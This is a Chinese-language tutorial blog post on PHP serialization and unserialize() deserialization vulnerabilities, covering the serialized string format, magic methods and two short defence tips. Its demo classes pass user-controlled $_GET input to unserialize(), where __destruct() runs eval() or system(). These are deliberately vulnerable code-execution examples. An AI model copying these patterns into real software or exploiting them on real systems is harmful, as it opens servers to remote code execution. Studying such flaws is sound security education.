    <content type="text"><![CDATA[PHP的序列化与反序列化通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。 serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。 unserialize()：将序列化后的字符串反序列化成一个对象。 简单示例： demo.php 123456789101112131415161718192021&lt;?phpclass Test&#123; public $name; public $blog;&#125;$test = new Test();$test-&gt;name = "SKI12";$test-&gt;blog = "https://blog.csdn.net/ski_12";echo "创建对象并给其属性赋值：&lt;br&gt;";foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;$str = serialize($test);echo "&lt;br&gt;对象序列化后的字符串：".$str;$f = fopen('test.txt', 'w');fwrite($f, $str);fclose($f);?&gt; 运行后，可以看到创建的对象序列化后的字符串： demo2.php 1234567891011&lt;?php$f = fopen("test.txt", "r");$str = fread($f, filesize("test.txt"));echo "读取序列化的字符串：".$str;echo "&lt;br&gt;&lt;br&gt;经过反序列化后的结果如下：&lt;br&gt;";$test = unserialize($str);foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;?&gt; 运行后，可以看到反序列化后得到对象实例：可知，创建的对象序列化后的内容为： 1O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;SKI12&quot;;s:4:&quot;blog&quot;;s:28:&quot;https://blog.csdn.net/ski_12&quot;;&#125; 简单分析一下，“O”即Object对象，“4”为对象名的长度，“Test”即对象名，“2”为对象的属性个数；进入大括号为属性的内容，“s”即string字符串类型，“4”即该属性名的长度，“name”即该属性名，接着“;”分号间隔键值或不同属性，这里为间隔键和值，后续的同理分析。 unserialize()反序列化漏洞基本概念PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的敏感操作，则会造成PHP反序列化漏洞的风险。 利用前提 unserialize()函数的参数可控； 代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类； 所写的内容需要有对象中的成员变量的值。 下面列下可能经常碰到的魔法函数，其余的查查资料也知道了。 __construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __toString()：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。 __sleep()：常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误。 __wakeup()：经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 一个简单的测试Demo： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Vuln&#123; public $name; public $blog; function __construct()&#123; echo "[*]调用__construct()&lt;br&gt;"; &#125; function __destruct()&#123; echo "[*]调用__destruct()&lt;br&gt;"; &#125; function __wakeup()&#123; echo "[*]调用__wakeup()&lt;br&gt;"; &#125; function __sleep()&#123; echo "[*]调用__sleep()&lt;br&gt;"; return array('name', 'blog'); &#125; function __toString()&#123; echo "[*]调用__toString()&lt;br&gt;"; return $this-&gt;name." : ".$this-&gt;blog."&lt;br&gt;"; &#125;&#125;echo "开始初始化对象...&lt;br&gt;";$test = new Vuln();$test-&gt;name = "SKI12";$test-&gt;blog = "https://blog.csdn.net/ski_12";echo "创建对象并给其属性赋值：&lt;br&gt;";foreach($test as $key =&gt; $value) &#123; echo $key." =&gt; ".$value."&lt;br&gt;";&#125;echo "开始序列化对象...&lt;br&gt;";$str = serialize($test);echo "对象序列化后的字符串：".$str."&lt;br&gt;";echo "开始反序列化对象...&lt;br&gt;";$str2 = unserialize($str);echo $str2;?&gt; 运行后可以看到各个魔法函数的调用次序： 反序列化漏洞DemoPHP代码执行示例： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; eval($this-&gt;name); &#125;&#125;$str = $_GET['ski_12'];unserialize($str);?&gt; 然后根据利用前提条件，构造序列化的字符串payload访问即可： 或者是命令执行，只需将eval()换为system()等即可： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; system($this-&gt;name); &#125;&#125;$str = $_GET['ski_12'];unserialize($str);?&gt; ###防御1、要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则； 2、要对于反序列化后的变量内容进行检查，以确定内容没有被污染。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
